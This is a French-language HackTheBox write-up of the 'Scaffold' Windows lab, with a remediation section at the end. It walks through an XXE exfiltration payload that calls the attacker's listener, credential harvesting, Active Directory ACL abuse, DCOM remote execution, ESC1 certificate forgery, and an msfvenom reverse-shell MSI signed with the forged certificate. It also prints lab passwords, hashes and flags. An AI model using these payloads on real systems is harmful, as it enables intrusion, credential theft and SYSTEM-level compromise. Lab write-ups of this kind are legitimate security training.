# HTB Scaffold — Write-up détaillé (User + Root)

**Machine :** Scaffold · Hard · Windows · `10.129.246.248`
**Date :** 2026-11-26
**Périmètre :** lab HackTheBox autorisé (`authorized-active`)
**Identifiants fournis :** `j.harris / Harr1sHelpdesk2026!Breach`

---

## 1. Vue d'ensemble de la chaîne

```
Identifiants j.harris (Helpdesk, rôle portail = Guest)
        │
        ├─ LDAP: description de m.carter contient BlueSkyTempReset2026! (compte désactivé)
        │
        └─ Ports 9800/9801: MDT Monitor (WCF Data Services + Event service, sans auth)
                │
                ▼
        Stored XXE (XmlDocument.LoadXml avec XmlUrlResolver)
        DTD externe + parameter entity → exfiltration HTTP de fichiers
                │
                ├─ Bootstrap.ini  → svc_mdt (expiré)
                └─ CustomSettings.ini → svc_deploy (leurre + vrai mot de passe)
                        │
                        ▼
        Password spray → r.wilson partage le mot de passe de svc_deploy
                        │
                        ▼
        5 écritures AD (ACL avec propriétés ciblées) :
          1. r.wilson AddSelf → Helpdesk operator
          2. Helpdesk operator GenericWrite → m.carter (clear ACCOUNTDISABLE)
          3. svc_deploy WriteProperty(groupType) → IT (distribution → security)
          4. svc_deploy WriteProperty(groupType) → Quarantined_Accounts (security → distribution)
          5. m.carter AddSelf → Endpoint Remote Management (droits DCOM)
                        │
                        ▼
        DCOM MMC20.Application → reverse shell m.carter → user.txt
                        │
                        ▼
        2 PFX dans C:\Dev\DevCerts, password neveragain (pfx2john + john)
        → PKINIT d.cooper (hash 8bf305...) ; m.chen partage le hash
                        │
                        ▼
        Machine account DEVNODE01$ créé dans OU=Dev_Machines (CreateChild de Package_Developers)
        → ESC1 sur PackagingCodeSigning (Enrollee Supplies Subject) → certificat CN=Package_Developers
                        │
                        ▼
        MSI Metasploit édité (ProductCode, ProductName, plink.exe) + signé avec le certificat forgé
        → upload as d.cooper, approve as m.chen (antiforgery token)
        → moteur de déploiement SYSTEM installe le MSI → reverse shell SYSTEM → root.txt
```

---

## 2. Reconnaissance

### 2.1 Scan complet

Le scan initial `--top-ports 2000` manquait les ports critiques. Un `-p-` révèle 32 ports, dont deux non identifiés :

```
53, 80, 88, 135, 139, 389, 443, 445, 464, 593, 636, 3268, 3269,
5040, 5985, 9389, 9800, 9801, 47001, + ports RPC dynamiques
```

**Concept :** un DC avec un rôle de déploiement expose souvent des services hors du top-1000. Les ports `9800/9801` renvoient un `503` nu avec `Microsoft-HTTPAPI/2.0` : signature d'un hôte **WCF / WCF Data Services** qui n'a rien de mappé à la racine. Il faut fuzzer les chemins, pas conclure que le service est mort.

### 2.2 Identity du domaine

Ldap over 389 donne :
- Domaine `scaffold.htb`, DC `dc.scaffold.htb`.
- Certificat du port 443 : `portal.scaffold.htb` → portail web (NTLM uniquement, pas de SPN HTTP Kerberos).
- `j.harris` est dans `Helpdesk` ; le portail l'affiche comme **Guest**.
- `m.carter` a dans son attribut `description` :
  `Retained for endpoint migration validation. Temp reset: BlueSkyTempReset2026!`
  → mot de passe valide mais compte désactivé (`STATUS_ACCOUNT_DISABLED`).

**Concept :** `description`, `info`, `comment` sont lisibles par tout utilisateur authentifié et servent souvent de bloc-notes aux admins.

### 2.3 Décalage d'horloge Kerberos

Le target est en avance de ~7h sur notre machine. Kerberos refuse les requêtes hors d'une fenêtre de 5 minutes (`KRB_AP_ERR_SKEW`). Contournement sans root : un petit shared library `LD_PRELOAD` qui décale `time()`, `gettimeofday()`, `clock_gettime()` de +25200 s.

---

## 3. Foothold : stored XXE dans MDT Monitor

### 3.1 Les deux services

```
curl http://10.129.246.248:9801/MDTMonitorData/$metadata
→ EntityType Computer { ID, Name, Settings (Edm.String, 4000), UniqueID, ... }

curl http://10.129.246.248:9801/MDTMonitorData/Computers
```

- **9801** : WCF Data Services (OData), collection `Computers`, champ `Settings`.
- **9800** : `MonitorEventService.GetSettings(uniqueId)` lit `Settings` et le passe à `XmlDocument.LoadXml`.

### 3.2 Pourquoi l'XXE classique ne marche pas

Une entité générale définie dans le sous-ensemble interne (`<!ENTITY xxe SYSTEM "file:///...">`) est résolue mais **non substituée** dans l'arbre de `XmlDocument` : on récupère un nœud de référence, pas le contenu. La forme qui fonctionne est une **DTD externe hébergée chez nous** avec une **entité de paramètre** :

```xml
<!DOCTYPE Settings SYSTEM "http://10.10.14.107:8000/evil.dtd">
<Settings>&send;</Settings>
```

`evil.dtd` :
```xml
<!ENTITY % file SYSTEM "file:///Y:/DeploymentShare/Control/CustomSettings.ini">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.107:8000/leak?d=%file;'>">
%all;
```

La substitution de `%file;` dans l'URL déclenche un fetch HTTP vers notre listener : le fichier sort en clair dans le query string.

**Concepts :**
- `XmlDocument` garde par défaut un `XmlUrlResolver` : un `SYSTEM` dans le DOCTYPE peut fetcher une URL réseau.
- Le chemin `Y:\DeploymentShare\...` est le lecteur mappé localement du partage MDT sur le DC.
- Le `MERGE` OData ne doit **pas** envoyer d'en-tête `If-Match` (pas d'ETag déclaré → 400).
- La preuve est dans la stack trace du serveur : `GetSettings` → `XmlDocument.LoadXml` → `XmlUrlResolver.GetEntity` → `HttpWebRequest.GetResponse`.

### 3.3 Credentials extraits

`Bootstrap.ini` : `svc_mdt / RubiksCubeTwice2026!` (compte expiré → inutilisable).
`CustomSettings.ini` : deux mots de passe pour `svc_deploy` :
- `UserPassword=DeployPipe2026$Secure` → **leurre** (STATUS_LOGON_FAILURE)
- `DomainAdminPassword=Depl0yPipe2026$Secure` → **valide**

Spray du mot de passe valide sur la liste des utilisateurs → `r.wilson` partage le même mot de passe.

---

## 4. Mouvement latéral : 5 écritures AD

### 4.1 L'ACE invisible de BloodHound

`svc_deploy` est le seul membre de `IDENTITY_OPERATIONS`. Ce groupe détient un **ACCESS_ALLOWED_OBJECT_ACE** avec :
- mask `WriteProperty (0x20)`
- `ACE_OBJECT_TYPE_PRESENT`
- ObjectType = GUID `9a9a021e-4a5b-11d1-a9c3-0000f80367c1` = attribut **`groupType`**

...sur deux groupes seulement : `IT` et `Quarantined_Accounts`. BloodHound ne dessine pas ce type d'ACE (autorité sur un seul attribut). `dacledit.py -action read` le montre.

### 4.2 Pourquoi `groupType` est critique

| Groupe | Valeur initiale | Signification |
|---|---|---|
| `IT` | `2` | **distribution** global → son SID n'entre jamais dans un token |
| `Quarantined_Accounts` | `-2147483640` (`0x80000008`) | security universal → SID dans le token |

- `IT` détient un `AddSelf` vers `Endpoint Remote Management`, mais étant un groupe de **distribution**, cette ACE est inerte.
- `Quarantined_Accounts` est ciblé par une GPO `SeDenyNetworkLogonRight` : toute connexion réseau de ses membres est refusée (d'où l'échec WinRM de `m.carter` même après réactivation).

**Concept :** modifier `groupType` pour passer de distribution à security (ou inversement) active/désactive des ACE et des deny rights sans toucher aux appartenances. Écrire `-2147483646` (`0x80000002`) transforme un groupe global en security global.

### 4.3 Les 5 étapes (script `scaffold_chain.py`)

| # | Identité | Écriture | Effet |
|---|---|---|---|
| 1 | r.wilson | AddSelf → Helpdesk operator | son token gagne le groupe |
| 2 | Helpdesk operator | GenericWrite → m.carter | UAC `0x10202` → `0x10200` (compte réactivé) |
| 3 | svc_deploy | WriteProperty(groupType) → IT | `2` → `-2147483646` |
| 4 | svc_deploy | WriteProperty(groupType) → Quarantined_Accounts | `-2147483640` → `2` (deny neutralisé) |
| 5 | m.carter | AddSelf → Endpoint Remote Management | droits DCOM obtenus |

### 4.4 Shell DCOM

WinRM est refusé à `m.carter` (pas membre de `Remote Management Users`). Le chemin est **DCOM** via `MMC20.Application` (CLSID `49B2791A-B1AE-4C90-9B8E-E860BA07F889`) : `Document.ActiveView.ExecuteShellCommand` lance un process avec les droits de l'appelant. `dcomexec.py` échoue ici (`CO_E_RUNAS_LOGON_FAILURE`) ; un lanceur maison avec reconstitution de l'interface `IRemUnknown2` et un reverse shell PowerShell fonctionne.

`user.txt` : `a8917d401c3c063af8c36893435414db`

---

## 5. Escalade : certificat de signature forgé + MSI SYSTEM

### 5.1 Les certificats de dev

`C:\Dev\DevCerts` contient deux PFX lisibles par `m.carter`. `pfx2john` + `john` (rockyou) → mot de passe **`neveragain`**.
- `InternalCodeSigning_01.pfx` → `d.cooper` (SAN UPN), EKU Client Auth + Code Signing → PKINIT via `certipy auth` avec faketime → hash NT `8bf305c62b94c9def1c5c30fb24ff2b8`.
- `InternalCodeSigning_02.pfx` → `t.walker` ici (pas m.chen). Heureusement `m.chen` partage le même hash NT, vérifié en pass-the-hash SMB.

### 5.2 Créer un compte machine

Quota `ms-DS-MachineAccountQuota` épuisé pour `m.carter`. `SeMachineAccountPrivilege` ne contourne le quota que si le principal a `Create Child` sur le conteneur. `Package_Developers` a cet ACE sur `OU=Dev_Machines` ; `d.cooper` en est membre.

`impacket-addcomputer -method LDAPS` avec le hash de `d.cooper` et `-computer-group OU=Dev_Machines,...` contourne le contrôle client et crée `DEVNODE01$ / DevNodePass2026!` avec `primaryGroupID=515` (Domain Computers), peu importe l'OU.

### 5.3 ESC1 sur `PackagingCodeSigning`

Template :
- `Enrollee Supplies Subject = True`
- EKU `Code Signing`
- pas d'approbation, pas de signature autorisée
- enrollment : `Domain Computers`

**Concept clé :** `certipy find -vulnerable` évalue la vulnérabilité **par rapport à l'identité utilisée**. Lancé en tant qu'utilisateur, il ne voit rien ; lancé comme `DEVNODE01$`, le template est du texte book ESC1.

Enrôlement avec `-subject 'CN=Package_Developers'` (et non `-upn`, qui ne change que le SAN et laisse le subject `CN=DEVNODE01$`) → `pkgdev.pfx` :
```
subject=CN=Package_Developers
issuer=DC=htb, DC=scaffold, CN=scaffold-DC-CA
valid until 2125
```

### 5.4 Le piège de la signature

Le moteur `Deploy-Engine.ps1` vérifie :
- `$sig.Status -eq 'Valid'`
- `$cert.NotAfter -ge (Get-Date)`
- `$cert.Subject -ne 'CN=Package_Developers'` → comparaison **exacte**
- `$cert.Issuer -notlike '*scaffold-DC-CA*'` → comparaison **sous-chaîne**

**Concept :** l'asymétrie des opérateurs est la faille. Le subject doit être exact, mais l'issuer peut simplement *contenir* le mot-clé. N'importe quel certificat émis par cette CA avec notre subject choisi satisfait le contrôle. `Test-MsiHash` est optionnel (pas de `hashes.json` pour PuTTY) et `Get-AppConfig` interdit de choisir un autre `deploy.json`.

### 5.5 Construction du MSI

- `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.107 LPORT=8443 -f msi`
- `msidump` puis édition des `.idt` :
  - `ProductCode = {ED41CD4E-33BB-400C-AB20-B09388DC83EF}`
  - `ProductName = PuTTY`
  - suppression de `FailInstallation` (type 3110 = échec inconditionnel qui annule l'install)
  - ajout de `plink.exe` (stub mingw qui retourne 0) dans `Program Files\PuTTY` via cabinet `putty.cab`
- `msibuild` pour réimporter les tables + le cabinet
- `osslsigncode sign -pkcs12 pkgdev.pfx -pass ''`

L'action `ExecPayload` (type 3266, différée sans impersonation) s'exécute dans le contexte **SYSTEM** du moteur d'installation.

### 5.6 Portail : upload + approbation

- `portal_client.py` : client NTLMv2 **à partir du hash NT** (impacket + `http.client` keep-alive) — `curl --ntlm` exige un mot de passe en clair.
- Upload en `d.cooper` → `/Package/Upload` avec `__RequestVerificationToken` (form field + cookie).
- Approbation en `m.chen` via `approve_pkg.py` : GET `/Validation/Review/9` pour récupérer token + cookie, puis POST `/Validation/Approve/9` avec `notes`, `signatureOk`, `hashOk`, `productCodeOk`, `metadataOk`.

Le moteur est **event-driven** (pas de scheduled task) : il consomme le package de `Ready` en ~1 minute et l'installe.

`root.txt` : `6d553c7bae22f97c2bf5ab9b80f8179e`

---

## 6. Annexes

### Flags

| Flag | Valeur |
|---|---|
| User | `a8917d401c3c063af8c36893435414db` |
| Root | `6d553c7bae22f97c2bf5ab9b80f8179e` |

### Concepts techniques

| Concept | Explication |
|---|---|
| **XXE / XmlUrlResolver** | Un `DOCTYPE SYSTEM` dans du XML parsé par `XmlDocument` déclenche un fetch externe ; une entité de paramètre dans une DTD externe permet d'exfiltrer n'importe quel fichier lisible. |
| **OData / WCF Data Services** | API REST Microsoft (`$metadata`, `MERGE`, entry Atom) ; ici sans authentification. |
| **groupType** | Attribut AD qui décide si un groupe est *security* (SID dans le token) ou *distribution* (SID ignoré). Le modifier active/désactive ACE et deny rights. |
| **ACCESS_ALLOWED_OBJECT_ACE** | ACE ciblant un seul attribut via son GUID de schéma ; invisible dans BloodHound. |
| **SeDenyNetworkLogonRight** | Refus de connexion réseau évalué avant l'autorisation ; neutralisé en rendant le groupe de denial non-security. |
| **DCOM MMC20** | `ExecuteShellCommand` est une primitive d'exécution à distance quand on a les droits de launch/activation. |
| **PFX / PKINIT** | Un certificat avec EKU Client Authentication permet de s'authentifier en Kerberos ; `pfx2john` casse le mot de passe d'export. |
| **ESC1** | Template avec `Enrollee Supplies Subject` : le requérant choisit le subject du certificat. La dangerosité dépend de l'identité qui enrôle. |
| **ms-DS-MachineAccountQuota** | Plafond de création de comptes machine ; contournable avec `SeMachineAccountPrivilege` + `Create Child` sur l'OU cible. |
| **Authenticode** | Signature de code ; ici la porte compare le subject exactement mais l'issuer en sous-chaîne → signature forgée acceptée. |
| **Antiforgery ASP.NET Core** | Token de formulaire + cookie de la même session, tous deux requis. |

### Correction

1. Désactiver `DtdProcessing` et mettre `XmlResolver = null` dans le parseur MDT ; supprimer les rôles Monitor non nécessaires.
2. Retirer les mots de passe en clair de `Bootstrap.ini`/`CustomSettings.ini` (gMSA).
3. Supprimer les ACE `AddSelf` et `GenericWrite` excessives ; traiter l'écriture de `groupType` comme `WriteDacl`.
4. Restreindre l'enrôlement `PackagingCodeSigning` à un compte dédié, désactiver `Enrollee Supplies Subject`.
5. Épingler le certificat de signature par **thumbprint** et rendre `Test-MsiHash` obligatoire.
6. Ne pas bind-monter/exposer le pipeline de déploiement avec les mêmes privilèges que le portail.

*Toutes les étapes ont été rejouées et vérifiées sur la cible le 2026-11-26.*
